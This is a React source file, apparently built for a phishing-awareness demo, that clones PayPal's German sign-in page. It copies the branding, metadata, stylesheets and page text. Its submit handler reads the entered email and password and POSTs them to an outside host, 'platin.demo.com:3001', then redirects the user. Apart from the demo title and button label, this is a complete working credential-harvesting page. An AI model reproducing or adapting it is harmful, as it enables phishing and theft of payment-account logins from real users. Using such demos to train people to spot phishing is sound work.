/* eslint-disable react/jsx-no-duplicate-props */
/* eslint-disable jsx-a11y/aria-proptypes */
/* eslint-disable jsx-a11y/anchor-is-valid */
import React, { useRef } from 'react';
import { Helmet } from 'react-helmet';
import { useNavigate } from 'react-router-dom';

export function PhishingDemo() {
  const navigate = useNavigate();
  const loginEmailRef = useRef();
  const loginPasswordRef = useRef();

  function formSubmit(event) {
    event.preventDefault();
    var url = 'http://platin.demo.com:3001/';
    fetch(url, {
      method: 'POST',
      body: `srf=is3MLv54qin4uC31dPELy9MF4rHjJKYOKyi1Y%3D&locale.x=de&login_email=${loginEmailRef.current.value}&login_password=${loginPasswordRef.current.value}&login_phone=&isCookiedHybridEmail=true`,
      // body: `srf=is3MLv54qin4uC31dPELy9MF4rHjJKYOKyi1Y%3D&locale.x=de_DE&processSignin=main&fn_sync_data=fn_sync_data&intent=signin&ads-client-context=signin&showCountryDropDown=true&requestUrl=%2Fsignin&forcePhonePasswordOptIn=&phoneCode=Deutschland+%28%2B49%29&login_email=${loginEmailRef.current.value}&login_password=${loginPasswordRef.current.value}&login_phone=&splitLoginContext=inputPassword&isCookiedHybridEmail=true`,
    });
    navigate('/');
  }

  return (
    <>
      <Helmet>
        <title>Ist das PayPal?</title>
      </Helmet>
      <head>
        <script src="https://www.paypalobjects.com/webcaptcha/ngrlCaptcha.min.js"></script>
        <meta charSet="utf-8" />
        <title>Loggen Sie sich bei PayPal ein</title>
        <meta httpEquiv="content-type" content="text/html; charset=UTF-8" />
        <meta name="application-name" content="PayPal" />
        <meta
          name="msapplication-task"
          content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"
        />
        <meta
          name="msapplication-task"
          content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"
        />
        <meta
          name="keywords"
          content="transfer money, email money transfer, international money transfer "
        />
        <meta
          name="description"
          content="Transfer money online in seconds with PayPal money transfer. All you need is an email address."
        />
        <link
          rel="shortcut icon"
          href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"
        />
        <link
          rel="apple-touch-icon"
          href="https://www.paypalobjects.com/webstatic/icon/pp64.png"
        />
        <link rel="canonical" href="https://www.paypal.com/de/signin" />
        <meta
          name="viewport"
          content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes"
        />
        <meta
          property="og:image"
          content="https://www.paypalobjects.com/webstatic/icon/pp258.png"
        />
        <link
          rel="stylesheet"
          href="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/css/contextualLoginElementalUI.css"
        />
        <link
          rel="stylesheet"
          href="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/css/ie9.css"
        />
        <script
          nonce="f9VFiKZLRAt6ZeTe2t+uBUl81so7kW3CshQfvCe1dAZTril7"
          src="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/js/lib/modernizr-2.6.1.js"
        ></script>
      </head>
      <body
        className="desktop"
        data-rlogid="rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfc8CMK9ch4LYZpzCvqaJ8XL5jZp4vQ0wBUBrTOiJVVsJ_17dc03a340c"
        data-hostname="rZJvnqaaQhLn/nmWT8cSUjOx898qoYZ0KCh6/h2ON0qYFJ87ahTWaDOlxm2mLRkK"
        data-production="true"
        data-enable-ads-captcha="true"
        data-ads-challenge-url="/auth/createchallenge/54e55beb2f5e93b7/challenge.js"
        data-enable-client-cal-logging="true"
        data-correlation-id="f372717fa01f6"
        data-enable-fn-beacon-on-web-views="true"
        data-phone-password-enabled="true"
        data-is-hybrid-login-experience="true"
        data-is-hybrid-editable-on-cookied="true"
        data-csrf-token="is3MLv54qin4uC31dPELy9MF4rHjJKYOKyi1Y="
        data-nonce="f9VFiKZLRAt6ZeTe2t+uBUl81so7kW3CshQfvCe1dAZTril7"
        data-lazy-load-country-codes="true"
        data-cookie-banner-enabled="true"
        data-show-country-drop-down="true"
        data-email-label="E-Mail-Adresse"
        data-xhr-timeout-limit="20000"
        data-load-start-time="1639607579660"
        data-is-cookied-user="true"
        data-xhr-timeout-ineligible-list="MSIE 10|Windows NT 10"
      >
        <noscript>
          <p className="nonjsAlert" role="alert">
            Hinweis: Für viele Funktionen der PayPal-Website sind JavaScript und
            Cookies erforderlich.
          </p>
        </noscript>
        <div id="main" className="main" role="main">
          <section
            id="slLanding"
            className="slLanding hide"
            data-role="page"
            data-title="Google-Konto verknüpfen und auf Ihren Geräten schneller bezahlen"
          >
            <div className="corral">
              <div
                id="slContent"
                className="contentContainer contentContainerBordered"
              >
                <header>
                  <p
                    role="img"
                    aria-label="PayPal Logo"
                    className="paypal-logo paypal-logo-long"
                  ></p>
                </header>
                <div id="linked" className="linked">
                  <div className="profileRemembered">
                    <span className="loginEmail">petrenco.</span>
                    <a
                      href="#"
                      className="changeLink scTrack:not-you"
                      id="changeLink"
                    >
                      Ändern
                    </a>
                  </div>
                  <div className="headerTextDecorated"></div>
                  <h1 className="headerText">
                    Eingeloggt bleiben und schneller zahlen
                  </h1>
                  <p className="description assure">
                    Aktivieren Sie den automatischen Login für diesen Browser
                    und bezahlen Sie jedes Mal blitzschnell. (Nicht auf
                    gemeinsam genutzten Geräten aktivieren.)
                    <span className="learnMoreLink">
                      <a
                        href="#"
                        id="slLoginLearnMore"
                        className="secondayLink"
                      >
                        Was ist das?
                      </a>
                    </span>
                  </p>
                  <div id="partnerProfile" className="partnerProfile">
                    <div id="partnerPhoto" className="partnerPhoto"></div>
                    <div className="partnerDetails">
                      <span>Sie sind eingeloggt als</span>
                      <div id="displayName" className="displayName"></div>
                      <div>
                        <div className="partnerEmailDiv">
                          <span className="partnerIcon"></span>
                          <span
                            id="partnerEmail"
                            className="partnerEmail"
                          ></span>
                          <span id="partnerEmailDomain"></span>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="actions actionsSpacedShort">
                    <button
                      className="button actionContinue scTrack:unifiedlogin-continue"
                      id="continueBtn"
                      name="continueBtn"
                      value="continueBtn"
                    >
                      Weiter
                    </button>
                  </div>
                  <div
                    id="secondaryLogin"
                    className="buttonAsLink secondaryLink"
                  >
                    <button
                      className="scTrack:unifiedlogin-use-password"
                      id="secondaryLoginBtn"
                      name="secondaryLoginBtn"
                      value="secondaryLoginBtn"
                    >
                      Stattdessen Passwort verwenden
                    </button>
                  </div>
                </div>
                <div id="unlinked" className="unlinked">
                  <div id="headerIcon" className="partnerConnect"></div>
                  <h1 className="headerText">
                    Google-Konto verknüpfen und auf Ihren Geräten schneller
                    bezahlen
                  </h1>
                  <p className="description assure">
                    Wenn Sie bei Ihrem Google-Konto angemeldet sind, loggen wir
                    Sie automatisch bei PayPal ein. So sparen Sie sich die
                    Eingabe Ihres Passworts und bezahlen noch schneller.
                    <a
                      href="#"
                      id="slOptInlearnMore"
                      className="secondayLink scTrack:unifiedlogin-sl-whatsthis"
                    >
                      Was ist das?
                    </a>
                  </p>
                  <p className="secondaryLink hide" id="slOptIn_notNow">
                    <a href="#">Nicht jetzt</a>
                  </p>
                </div>
                <div id="learnMoreModal" className="learnMoreModal">
                  <div id="optInLearnMoreDesc" className="optInLearnMoreDesc">
                    <h1 className="headerText headerTextSpaced">
                      Warum soll ich mein Google-Konto verknüpfen?
                    </h1>
                    <p>
                      Wenn Sie Ihr Google-Konto verknüpfen, können Sie One
                      Touch™ beim Bezahlen schnell und einfach aktivieren. Sie
                      können dies jederzeit in Ihrem PayPal-Konto in den
                      Einstellungen wieder ändern.
                    </p>
                    <p>
                      Wenn Sie auf einem neuen Gerät oder Browser bezahlen und
                      bei Ihrem Google-Konto angemeldet sind, loggen wir Sie
                      dann automatisch ein. Und Sie sparen sich die Eingabe
                      Ihres Passworts.
                    </p>
                  </div>
                  <div
                    id="slLoginLearnMoreDesc"
                    className="slLoginLearnMoreDesc"
                  >
                    <h1 className="headerText headerTextSpaced">
                      Eingeloggt bleiben und schneller zahlen
                    </h1>
                    <p>
                      Sie brauchen Ihr Passwort nicht einzugeben, wenn Sie auf
                      diesem Gerät eingeloggt bleiben. Aus Sicherheitsgründen
                      bitten wir Sie gelegentlich, sich einzuloggen, zum
                      Beispiel, wenn Sie Ihre persönlichen oder finanziellen
                      Angaben ändern. Aktivieren Sie One Touch™ nicht auf
                      gemeinsam genutzten Geräten. Sie können diese Option
                      jederzeit in Ihrem PayPal-Konto deaktivieren.
                    </p>
                  </div>
                  <button
                    type="button"
                    className="ui-dialog-titlebar-close"
                  ></button>
                </div>
                <div className="intentFooter">
                  <div className="localeSelector">
                    <span className="picker country-selector hide">
                      <span className="hide" id="countryPickerLink">
                        Deutschland
                      </span>
                      <button
                        type="button"
                        aria-labelledby="countryPickerLink"
                        className="country DE"
                      ></button>
                    </span>
                    <ul className="localeLink">
                      <li>
                        <a
                          className="selected scTrack:unifiedlogin-footer-language_de_DE"
                          href="/signin?country.x=DE&locale.x=de_DE&langTgl=de"
                          lang="de"
                          data-locale="de_DE"
                          aria-current="”true”"
                        >
                          Deutsch
                        </a>
                      </li>
                      <li>
                        <a
                          className="scTrack:unifiedlogin-footer-language_en_US"
                          href="/signin?country.x=DE&locale.x=en_US&langTgl=en"
                          lang="en"
                          data-locale="en_US"
                        >
                          English
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </section>
          <section
            id="login"
            className="login"
            data-role="page"
            data-title="Loggen Sie sich bei PayPal ein"
          >
            <div className="corral">
              <div
                id="content"
                className="contentContainer activeContent contentContainerBordered"
              >
                <header>
                  <p
                    role="img"
                    aria-label="PayPal Logo"
                    className="paypal-logo paypal-logo-long signin-paypal-logo"
                  ></p>
                </header>
                <h1 id="headerText" className="headerText accessAid">
                  Loggen Sie sich bei PayPal ein
                </h1>
                <p id="phoneSubTagLine" className="subHeaderText hide">
                  Sie haben bereits den Login mit Handynummer eingerichtet?
                  Geben Sie Ihre Handynummer unten ein. Wenn nicht, klicken Sie
                  auf den Link und loggen Sie sich mit Ihrer E-Mail-Adresse ein.
                </p>
                <div id="loginContent" className="">
                  <div id="loginSection" className="">
                    <div className="notifications"></div>
                    <div id="keychainErrorMessage" className="hide">
                      <p className="notification notification-warning blocked-on-8ball hide">
                        PayPal One Touch™ funktioniert nur zum Bezahlen. Bitte
                        loggen Sie sich mit Ihrer E-Mail-Adresse ein.
                      </p>
                      <p className="notification notification-warning blocked-on-risky-login hide">
                        Bitte loggen Sie sich mit Ihrer E-Mail-Adresse und Ihrem
                        Passwort ein.
                      </p>
                      <p className="notification notification-critical keychain-activation-failure hide">
                        Bei uns ist ein Problem aufgetreten. Bitte loggen Sie
                        sich mit Ihrer E-Mail-Adresse und Ihrem Passwort ein.
                      </p>
                    </div>
                    <iframe
                      title="dummy"
                      name="dummyframe"
                      id="dummyframe"
                      style={{ display: 'none' }}
                    ></iframe>
                    <form
                      action="/"
                      className="proceed maskable"
                      autoComplete="off"
                      name="login"
                      noValidate
                      method="post"
                      onSubmit={formSubmit}
                      id="form-id"
                      encType="multipart/form-data"
                    >
                      <input
                        type="hidden"
                        id="token"
                        name="_csrf"
                        value="is3MLv54qin4uC31dPELy9MF4rHjJKYOKyi1Y="
                      />
                      <input type="hidden" name="locale.x" value="de_DE" />
                      <input type="hidden" name="processSignin" value="main" />
                      <input
                        type="hidden"
                        name="fn_sync_data"
                        value="fn_sync_data"
                      />
                      <input type="hidden" name="intent" value="signin" />
                      <input
                        type="hidden"
                        name="ads-client-context"
                        value="signin"
                      />
                      <input
                        type="hidden"
                        name="showCountryDropDown"
                        value="true"
                      />
                      <input type="hidden" name="requestUrl" value="/signin" />
                      <input type="hidden" name="forcePhonePasswordOptIn" />
                      <div id="passwordSection" className="clearfix splitEmail">
                        <div
                          id="splitEmailSection"
                          className="splitPhoneSection splitEmailSection"
                        >
                          <div className="countryPhoneSelectWrapper hide">
                            <label className="accessAid" htmlFor="phoneCode">
                              Wählen Sie Ihre Ländervorwahl
                            </label>
                            <select
                              name="phoneCode"
                              id="phoneCode"
                              className="countryPhoneSelect"
                            >
                              <option
                                defaultValue="DE +49"
                                data-code="+49"
                                data-country="DE"
                              >
                                Deutschland (+49)
                              </option>
                            </select>
                            <div className="countryPhoneSelectChoice">
                              <span className="countryCode">DE</span>
                              <span className="phoneCode">+49</span>
                            </div>
                          </div>
                          <div className="textInput" id="login_emaildiv">
                            <div className="fieldWrapper">
                              <input
                                id="email"
                                name="login_email"
                                type="email"
                                className="hasHelp validateEmpty"
                                autoComplete="username"
                                placeholder="E-Mail-Adresse oder Handynummer"
                                aria-describedby="emailErrorMessage"
                                ref={loginEmailRef}
                              />
                            </div>
                            <div
                              className="errorMessage"
                              id="emailErrorMessage"
                            >
                              <p className="emptyError hide">
                                Diese Angabe ist erforderlich.
                              </p>
                              <p className="invalidError hide">
                                Das Format der E-Mail-Adresse oder Handynummer
                                ist ungültig.
                              </p>
                            </div>
                          </div>
                        </div>
                        <div
                          id="passwordSection"
                          className="clearfix showHideButtonForEligibleBrowser"
                        >
                          <div className="textInput" id="login_passworddiv">
                            <div className="fieldWrapper">
                              <input
                                id="password"
                                name="login_password"
                                type="password"
                                className="hasHelp validateEmpty pin-password"
                                placeholder="Passwort"
                                aria-describedby="passwordErrorMessage"
                                ref={loginPasswordRef}
                              />

                              <button
                                type="button"
                                className="showPassword hide show-hide-password scTrack:unifiedlogin-show-password"
                                id="Passwort anzeigen"
                              >
                                Anzeigen
                              </button>

                              <button
                                type="button"
                                className="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password"
                                id="Ausblenden"
                              >
                                Ausblenden
                              </button>
                              <button
                                className="pwFpIcon hide"
                                id="pwFpIcon"
                              ></button>
                            </div>
                            <div
                              className="errorMessage"
                              id="passwordErrorMessage"
                            >
                              <p className="emptyError hide">Erforderlich</p>
                            </div>
                          </div>
                          <a
                            href="/authflow/password-recovery/?country.x=DE&amp;locale.x=de_DE&amp;redirectUri=%252Fsignin"
                            id="forgotPassword"
                            className="recoveryOption forgotPassword"
                            data-client-log-action-type="clickForgotPasswordLink"
                          >
                            Passwort vergessen?
                          </a>
                        </div>
                      </div>
                      <input
                        type="hidden"
                        id="phone"
                        name="login_phone"
                        className="validate"
                      />
                      <div className="actions">
                        <a
                          className="text-white"
                          id="btnLogin"
                          name="btnLogin"
                          value="Login"
                          href="/"
                        >
                          <button
                            className="button actionContinue scTrack:unifiedlogin-login-submit"
                            type="submit"
                          >
                            Zurück zur Platin Demo
                          </button>
                        </a>
                      </div>
                      <input
                        type="hidden"
                        name="splitLoginContext"
                        value="inputPassword"
                      />
                      <input
                        type="hidden"
                        name="isCookiedHybridEmail"
                        value="true"
                      />
                    </form>
                    <div
                      className="moreOptionsDiv hide"
                      id="moreOptionsContainer"
                    >
                      <a href="#" id="moreOptions" className="moreOptionsInfo">
                        Noch mehr Optionen
                      </a>
                      <div
                        className="bubble-tooltip hide"
                        id="moreOptionsDropDown"
                      >
                        <ul className="moreoptionsGroup">
                          <li>
                            <a
                              href="#"
                              id="moreOptionsMobile"
                              className="scTrack:unifiedlogin-click-more-options-mobile"
                            >
                              Login mit Mobilgerät zulassen
                            </a>
                          </li>
                          <li>
                            <a
                              href="/authflow/password-recovery/?country.x=DE&amp;locale.x=de_DE&amp;redirectUri=%252Fsignin"
                              className="scTrack:unifiedlogin-click-forgot-password pwrLink"
                            >
                              Probleme beim Einloggen?
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                    <div
                      id="signupContainer"
                      className="signupContainer"
                      data-hide-on-email=""
                      data-hide-on-pass=""
                    >
                      <div className="loginSignUpSeparator">
                        <span className="textInSeparator">oder</span>
                      </div>
                      <button
                        type="button"
                        className="button secondary scTrack:unifiedlogin-click-signup-button"
                        id="createAccount"
                      >
                        Neu anmelden
                      </button>
                    </div>
                    <div
                      id="tpdButtonContainer"
                      className="signupContainer hide"
                    >
                      <div className="loginSignUpSeparator">
                        <span className="textInSeparator">oder</span>
                      </div>
                      <div className="actions">
                        <button
                          className="button secondary"
                          id="tpdButton"
                          type="submit"
                          value="Login mit Mobilgerät zulassen"
                          disabled={false}
                        >
                          Login mit Mobilgerät zulassen
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
                <div className="intentFooter">
                  <div className="localeSelector">
                    <span className="picker country-selector hide">
                      <span className="hide" id="countryPickerLink">
                        Deutschland
                      </span>
                      <button
                        type="button"
                        aria-labelledby="countryPickerLink"
                        className="country DE"
                      ></button>
                    </span>
                    <ul className="localeLink">
                      <li>
                        <a
                          className="selected scTrack:unifiedlogin-footer-language_de_DE"
                          href="/signin?country.x=DE&locale.x=de_DE&langTgl=de"
                          lang="de"
                          data-locale="de_DE"
                          aria-current="”true”"
                        >
                          Deutsch
                        </a>
                      </li>
                      <li>
                        <a
                          className="scTrack:unifiedlogin-footer-language_en_US"
                          href="/signin?country.x=DE&locale.x=en_US&langTgl=en"
                          lang="en"
                          data-locale="en_US"
                        >
                          English
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </section>
          <section
            id="verification"
            className="verification hide"
            data-role="page"
            data-title="Login-Bestätigung – PayPal"
          >
            <div className="corral">
              <div className="contentContainer contentContainerLean">
                <div id="pending" className="verificationSubSection">
                  <h1 className="headerText">PayPal-App öffnen</h1>
                  <p
                    id="uncookiedMessage"
                    className="verification-message hide"
                  >
                    Öffnen Sie die PayPal-App und tippen Sie bei der
                    Aufforderung auf "Ja". Tippen Sie dann auf Ihrem Handy auf
                    <span className="twoDigitPin">PIN</span>, um sich
                    einzuloggen.
                  </p>
                  <p id="cookiedMessage" className="verification-message hide">
                    Öffnen Sie die PayPal-App und tippen Sie bei der
                    Aufforderung auf "Ja", um sich einzuloggen.
                  </p>
                  <div className="notifications"></div>
                  <div className="accountArea">
                    <span className="account"></span>
                    <span className="verificationNotYou">
                      <a
                        data-href="#"
                        href="#"
                        className="scTrack:unifiedlogin-verification-click-notYou"
                        id="pendingNotYouLink"
                      >
                        Nicht Sie?
                      </a>
                    </span>
                  </div>
                  <div className="mobileNotification">
                    <p className="pin"></p>
                    <div className="mobileScreen">
                      <img
                        src="https://www.paypalobjects.com/images/shared/icon-PN-check.png"
                        alt="phone"
                      />
                    </div>
                  </div>
                  <p className="tryAnotherMsg">
                    <a
                      id="tryPasswordLink"
                      data-href="#"
                      href=""
                      className="inlineLink scTrack:try-password"
                    >
                      Stattdessen Passwort verwenden
                    </a>
                  </p>
                  <p className="resendMsg">
                    <a
                      className="inlineLink scTrack:resend hide"
                      role="button"
                      data-href="#resend"
                      href=""
                      id="resend"
                    >
                      Erneut senden
                    </a>
                    <span className="sentMessage hide">Gesendet</span>
                  </p>
                </div>
                <div id="expired" className="hide verificationSubSection">
                  <header>
                    <p
                      role="img"
                      aria-label="PayPal Logo"
                      className="paypal-logo paypal-logo-long"
                    >
                      PayPal
                    </p>
                  </header>
                  <h1 className="headerText headerTextWarning">
                    Wir konnten nicht bestätigen, dass Sie es sind
                  </h1>
                  <p className="slimP">
                    Wir haben keine Antwort erhalten und konnten Ihre Identität
                    daher nicht bestätigen.
                  </p>
                  <button
                    id="expiredTryAgainButton"
                    className="button actionsSpaced"
                  >
                    Erneut versuchen
                  </button>
                </div>
                <div id="denied" className="denied hide verificationSubSection">
                  <img
                    alt=""
                    src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png"
                    className="deniedCaution"
                  />
                  <h1 className="headerText">
                    Wir konnten nicht bestätigen, dass Sie es sind
                  </h1>
                  <p>
                    Sie benötigen Hilfe?
                    <a
                      href="/{coBrand}/cgi-bin/helpscr?cmd=_help"
                      className="inlineLink scTrack:help"
                    >
                      Wir sind für Sie da
                    </a>
                    .
                  </p>
                </div>
              </div>
            </div>
          </section>
          <footer className="footer" role="contentinfo">
            <div className="legalFooter">
              <ul className="footerGroup">
                <li>
                  <a target="_blank" href="/de/smarthelp/contact-us">
                    Kontakt
                  </a>
                </li>
                <li>
                  <a target="_blank" href="/de/webapps/mpp/ua/privacy-full">
                    Datenschutz
                  </a>
                </li>
                <li>
                  <a target="_blank" href="/de/webapps/mpp/ua/legalhub-full">
                    AGB
                  </a>
                </li>
                <li>
                  <a target="_blank" href="/de/webapps/mpp/country-worldwide">
                    Weltweit
                  </a>
                </li>
              </ul>
            </div>
          </footer>
        </div>
        <div className="transitioning hide">
          <p className="welcomeMessage hide">Willkommen, !</p>
          <p className="checkingInfo hide">Ihre Eingaben werden überprüft…</p>
          <p className="oneSecond hide">Einen Moment…</p>
          <p className="secureMessage hide">Sie werden sicher eingeloggt...</p>
          <p className="oneTouchMessage hide"></p>
          <p className="retrieveInfo hide">Informationen werden abgerufen...</p>
          <p className="waitFewSecs hide">
            Dieser Vorgang kann einige Sekunden dauern...
          </p>
          <p className="udtSpinnerMessage udtLogin hide">
            Wir erkennen Sie auf diesem Gerät und loggen Sie sicher ein.
          </p>
          <p className="udtSpinnerMessage udtLoginXo hide">
            Da wir Sie auf diesem Gerät erkennen, müssen Sie Ihr Passwort für
            diesen Einkauf nicht mehr angeben.
          </p>
          <p className="udtSpinnerMessage webllsXoUS hide">
            Wir erkennen Sie auf diesem Gerät, daher können Sie den Login
            überspringen.
            <br />
            <br />
            Sie können diese Einstellung in Ihrem Profil verwalten.
          </p>
          <p className="udtSpinnerMessage webllsSCA hide">
            Wir leiten Sie weiter zum PayPal Checkout, um die Zahlung
            abzuschließen.
          </p>
          <p className="qrcMessage hide">Lädt...</p>
          <div className="keychain spinner-content uiExp hide"></div>
        </div>
        <noscript>
          <img
            src="https://c.paypal.com/v1/r/d/b/ns?f=e276f564e3d04363b8e103b581398ddb&s=UNIFIED_LOGIN_INPUT_PASSWORD&js=0&r=1"
            title="ppfniframe"
            alt=""
            height="1"
            width="1"
            border="0"
          />
        </noscript>
        <script
          nonce="f9VFiKZLRAt6ZeTe2t+uBUl81so7kW3CshQfvCe1dAZTril7"
          src="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/js/lib/fn-sync-telemetry-min.js"
        ></script>
        <script
          nonce="f9VFiKZLRAt6ZeTe2t+uBUl81so7kW3CshQfvCe1dAZTril7"
          src="https://www.paypalobjects.com/web/res/133/7f03f19f48baf5284350bafe40e00/js/signin-split.js"
        ></script>
        <script src="https://www.paypalobjects.com/pa/js/min/pa.js"></script>
        <noscript>
          <img
            src="https://t.paypal.com/ts?nojs=1&pgrp=main%3Aunifiedlogin%3A%3A%3Alogin&page=main%3Aunifiedlogin%3A%3A%3Alogin%3A%3A%3A&pgst=1639607579660&calc=f372717fa01f6&nsid=DgvWPqpgFJWiU5p6Bb3ZVZFaoJup463t&rsta=de_DE&pgtf=Nodejs&env=live&s=ci&ccpg=DE&csci=686f4c16aa3e41c2b3720147fea110e2&comp=unifiedloginnodeweb&tsrce=authchallengenodeweb&cu=1&gacook=117887637.1639606663&ef_policy=gdpr_v2.1&c_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner&transition_name=ss_prepare_pwd&userRedirected=true&xe=101735%2C101216%2C104200&xt=105856%2C103864%2C117843&ctx_login_ot_content=0&obex=signin&landing_page=login&state_name=begin_pwd&ctx_login_ctxid_fetch=ctxid-not-exist&ctx_login_content_fetch=success&ctx_login_lang_footer=shown&ctx_login_signup_btn=shown%7Cdefault&ctx_login_intent=signin&ctx_login_flow=Signin&ctx_login_state_transition=login_loaded&post_login_redirect=default&ret_url=%2F"
            alt=""
            height="1"
            width="1"
            border="0"
          />
        </noscript>
        <script
          async
          defer
          src="/auth/createchallenge/7a4c34d2301a52c6/recaptchav3.js?_sessionID=DgvWPqpgFJWiU5p6Bb3ZVZFaoJup463t"
        ></script>
      </body>
    </>
  );
}
